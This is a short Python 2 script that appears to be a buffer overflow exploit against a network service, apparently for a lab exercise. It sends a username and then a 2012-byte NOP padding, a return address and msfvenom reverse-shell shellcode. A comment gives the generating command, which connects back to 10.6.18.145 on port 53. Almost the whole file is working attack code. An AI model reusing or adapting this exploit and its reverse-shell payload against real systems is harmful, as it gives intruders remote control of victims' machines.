#!/usr/bin/env python

# Skeleton Buffer Overflow script
# usage python brain.py <targetIP> <targetPort>

import sys, socket

rhost = sys.argv[1]
rport = int(sys.argv[2])

uname = "Andre3000"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.145 LPORT=53 -f c -b "\x00"
shellcode = ("\xd9\xe8\xbb\x69\x94\x4f\x1d\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x58\x17\x03\x58\x17\x83\xa9\x90\xad\xe8\xd5\x71\xb3"
"\x13\x25\x82\xd4\x9a\xc0\xb3\xd4\xf9\x81\xe4\xe4\x8a\xc7\x08"
"\x8e\xdf\xf3\x9b\xe2\xf7\xf4\x2c\x48\x2e\x3b\xac\xe1\x12\x5a"
"\x2e\xf8\x46\xbc\x0f\x33\x9b\xbd\x48\x2e\x56\xef\x01\x24\xc5"
"\x1f\x25\x70\xd6\x94\x75\x94\x5e\x49\xcd\x97\x4f\xdc\x45\xce"
"\x4f\xdf\x8a\x7a\xc6\xc7\xcf\x47\x90\x7c\x3b\x33\x23\x54\x75"
"\xbc\x88\x99\xb9\x4f\xd0\xde\x7e\xb0\xa7\x16\x7d\x4d\xb0\xed"
"\xff\x89\x35\xf5\x58\x59\xed\xd1\x59\x8e\x68\x92\x56\x7b\xfe"
"\xfc\x7a\x7a\xd3\x77\x86\xf7\xd2\x57\x0e\x43\xf1\x73\x4a\x17"
"\x98\x22\x36\xf6\xa5\x34\x99\xa7\x03\x3f\x34\xb3\x39\x62\x51"
"\x70\x70\x9c\xa1\x1e\x03\xef\x93\x81\xbf\x67\x98\x4a\x66\x70"
"\xdf\x60\xde\xee\x1e\x8b\x1f\x27\xe5\xdf\x4f\x5f\xcc\x5f\x04"
"\x9f\xf1\xb5\x8b\xcf\x5d\x66\x6c\xbf\x1d\xd6\x04\xd5\x91\x09"
"\x34\xd6\x7b\x22\xdf\x2d\xec\x47\x26\x3f\x7d\x3f\x24\x3f\x7d"
"\xf5\xa1\xd9\x17\xe5\xe7\x72\x80\x9c\xad\x08\x31\x60\x78\x75"
"\x71\xea\x8f\x8a\x3c\x1b\xe5\x98\xa9\xeb\xb0\xc2\x7c\xf3\x6e"
"\x6a\xe2\x66\xf5\x6a\x6d\x9b\xa2\x3d\x3a\x6d\xbb\xab\xd6\xd4"
"\x15\xc9\x2a\x80\x5e\x49\xf1\x71\x60\x50\x74\xcd\x46\x42\x40"
"\xce\xc2\x36\x1c\x99\x9c\xe0\xda\x73\x6f\x5a\xb5\x28\x39\x0a"
"\x40\x03\xfa\x4c\x4d\x4e\x8c\xb0\xfc\x27\xc9\xcf\x31\xa0\xdd"
"\xa8\x2f\x50\x21\x63\xf4\x60\x68\x29\x5d\xe9\x35\xb8\xdf\x74"
"\xc6\x17\x23\x81\x45\x9d\xdc\x76\x55\xd4\xd9\x33\xd1\x05\x90"
"\x2c\xb4\x29\x07\x4c\x9d")

payload = "\x90" * 2012 + "\xdf\x14\x50\x62" + "\x90" * 20 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(uname + '\r\n')
s.recv(1024)
s.send(payload + '\r\n')
data = s.recv(1024)
s.close()